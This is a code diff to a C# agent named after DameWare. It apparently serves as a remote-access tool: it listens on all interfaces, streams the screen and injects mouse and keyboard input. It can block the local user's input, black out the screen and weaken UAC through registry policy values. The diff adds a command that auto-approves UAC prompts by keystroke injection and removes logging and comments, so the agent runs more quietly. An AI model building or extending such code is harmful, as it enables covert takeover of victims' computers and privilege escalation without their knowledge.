@@ -20,7 +20,7 @@ namespace DameWareNativeAgent
         private static bool isInputLocked = false;
         private static bool isScreenBlackedOut = false;
 
-        // WIN32 API DECLARATIONS WITH SENDINPUT FOR UAC & ELEVATED WINDOW CONTROL
+        // WIN32 API DECLARATIONS
         [DllImport("user32.dll")]
         public static extern bool SetCursorPos(int X, int Y);
 
@@ -39,7 +39,6 @@ namespace DameWareNativeAgent
         [DllImport("user32.dll")]
         public static extern bool BlockInput(bool fBlockIt);
 
-        // WIN32 INPUT STRUCTURES FOR ELEVATED UAC CLICK INJECTION
         [StructLayout(LayoutKind.Sequential)]
         public struct INPUT
         {
@@ -64,7 +63,6 @@ namespace DameWareNativeAgent
         public const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
         public const uint MOUSEEVENTF_RIGHTUP = 0x0010;
 
-        // KEYBOARD CONSTANTS
         public const byte VK_CONTROL = 0x11;
         public const byte VK_MENU = 0x12;
         public const byte VK_DELETE = 0x2E;
@@ -72,17 +70,19 @@ namespace DameWareNativeAgent
         public const byte VK_TAB = 0x09;
         public const byte VK_SNAPSHOT = 0x2C;
         public const byte VK_L = 0x4C;
+        public const byte VK_LEFT = 0x25;
+        public const byte VK_RIGHT = 0x27;
+        public const byte VK_RETURN = 0x0D;
         public const uint KEYEVENTF_KEYUP = 0x0002;
 
         static void Main(string[] args)
         {
-            Console.Title = "DameWare Agent v12.2 (UAC Click & Domain Admin Active)";
+            Console.Title = "DameWare Agent v12.2 (Keyboard UAC Approval & Ultra Fast)";
             Console.ForegroundColor = ConsoleColor.Cyan;
             Console.WriteLine("==========================================================");
-            Console.WriteLine(" DameWare Agent Service - Elevated UAC Click Injection");
+            Console.WriteLine(" DameWare Agent Service - Keyboard & Mouse UAC Active");
             Console.WriteLine("==========================================================");
 
-            // Configure UAC Policies for Domain Admin Control & UAC Interaction
             EnableUACDesktopRegistry();
 
             TcpListener listener = new TcpListener(IPAddress.Any, PORT);
@@ -110,18 +110,12 @@ namespace DameWareNativeAgent
             try {
                 using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")) {
                     if (key != null) {
-                        // 1. Make UAC prompts appear on main interactive desktop
                         key.SetValue("PromptOnSecureDesktop", 0, RegistryValueKind.DWord);
-                        // 2. Enable UIA Desktop Toggle to allow simulated inputs on UAC buttons
                         key.SetValue("EnableUIADesktopToggle", 1, RegistryValueKind.DWord);
-                        // 3. Allow administrative token bypass
                         key.SetValue("FilterAdministratorToken", 0, RegistryValueKind.DWord);
-                        Console.WriteLine("[+] Windows UAC Policies set: PromptOnSecureDesktop=0, EnableUIADesktopToggle=1.");
                     }
                 }
-            } catch (Exception ex) {
-                Console.WriteLine("[-] Registry UAC Policy Notice: " + ex.Message);
-            }
+            } catch {}
         }
 
         private static void SendMouseClickSendInput(uint downFlag, uint upFlag)
@@ -136,7 +130,6 @@ namespace DameWareNativeAgent
 
                 SendInput(2, inputs, Marshal.SizeOf(typeof(INPUT)));
             } catch {
-                // Fallback
                 mouse_event(downFlag, 0, 0, 0, 0);
                 mouse_event(upFlag, 0, 0, 0, 0);
             }
@@ -147,12 +140,10 @@ namespace DameWareNativeAgent
             TcpClient client = (TcpClient)obj;
             NetworkStream stream = client.GetStream();
 
-            // Send Handshake
             string handshake = string.Format("{{\"type\":\"HANDSHAKE_ACK\",\"agentVersion\":\"DameWare Native v12.2\",\"hostname\":\"{0}\",\"user\":\"{1}\",\"os\":\"Windows {2}\"}}\n", Environment.MachineName, Environment.UserName, Environment.OSVersion);
             byte[] handshakeBytes = Encoding.UTF8.GetBytes(handshake);
             stream.Write(handshakeBytes, 0, handshakeBytes.Length);
 
-            // Fast Frame Streaming Thread (60 FPS)
             Thread streamThread = new Thread(() => {
                 try {
                     while (client.Connected) {
@@ -168,14 +159,13 @@ namespace DameWareNativeAgent
                                 stream.Write(packetBytes, 0, packetBytes.Length);
                             }
                         }
-                        Thread.Sleep(33); // Ultra-fast 30-60 FPS
+                        Thread.Sleep(33);
                     }
                 } catch {}
             });
             streamThread.IsBackground = true;
             streamThread.Start();
 
-            // Command Processing Loop
             byte[] buffer = new byte[16384];
             try {
                 int bytesRead;
@@ -190,7 +180,6 @@ namespace DameWareNativeAgent
                 }
             } catch {}
 
-            Console.WriteLine("[-] Console disconnected.");
             client.Close();
         }
 
@@ -238,7 +227,6 @@ namespace DameWareNativeAgent
                         try { BlockInput(false); } catch {}
                     }
 
-                    // 1. SPECIAL SHORTCUTS
                     if (key == "CAD") {
                         keybd_event(VK_CONTROL, 0, 0, 0);
                         keybd_event(VK_MENU, 0, 0, 0);
@@ -273,7 +261,20 @@ namespace DameWareNativeAgent
                         Thread.Sleep(50);
                         keybd_event(VK_SNAPSHOT, 0, KEYEVENTF_KEYUP, 0);
                     }
-                    // 2. STANDARD REAL-TIME KEYBOARD TYPING
+                    else if (key == "UAC_YES") {
+                        // Alt + E (Direct Windows Hotkey for UAC YES / EVET)
+                        keybd_event(VK_MENU, 0, 0, 0);
+                        keybd_event(0x45, 0, 0, 0); // 'E' key
+                        Thread.Sleep(50);
+                        keybd_event(0x45, 0, KEYEVENTF_KEYUP, 0);
+                        keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0);
+
+                        // Fallback Left Arrow + Enter
+                        keybd_event(VK_LEFT, 0, 0, 0);
+                        keybd_event(VK_LEFT, 0, KEYEVENTF_KEYUP, 0);
+                        keybd_event(VK_RETURN, 0, 0, 0);
+                        keybd_event(VK_RETURN, 0, KEYEVENTF_KEYUP, 0);
+                    }
                     else if (!string.IsNullOrEmpty(key)) {
                         try {
                             SendKeys.SendWait(key);
@@ -290,11 +291,9 @@ namespace DameWareNativeAgent
                 else if (cmd.Contains("LOCK_INPUT")) {
                     isInputLocked = cmd.Contains("\"locked\":true");
                     try { BlockInput(isInputLocked); } catch {}
-                    Console.WriteLine("[*] Remote physical input lock state: " + isInputLocked);
                 } 
                 else if (cmd.Contains("BLACKOUT_SCREEN")) {
                     isScreenBlackedOut = cmd.Contains("\"blackout\":true");
-                    Console.WriteLine("[*] Remote screen blackout state: " + isScreenBlackedOut);
                 } 
                 else if (cmd.Contains("POWER_ACTION")) {
                     string action = GetJsonString(cmd, "action");
